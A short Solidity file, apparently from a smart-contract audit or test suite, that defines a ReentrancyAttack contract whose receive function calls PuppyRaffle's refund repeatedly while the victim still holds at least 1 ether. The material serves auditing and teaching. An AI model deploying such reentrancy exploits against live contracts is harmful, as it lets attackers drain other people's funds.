// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttack {
    PuppyRaffle puppyRaffle;

    constructor(address victim) {
        puppyRaffle = PuppyRaffle(victim);
    }

    function attack() public {
        puppyRaffle.refund(3);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= 1 ether) {
            puppyRaffle.refund(3);
        }
    }
}
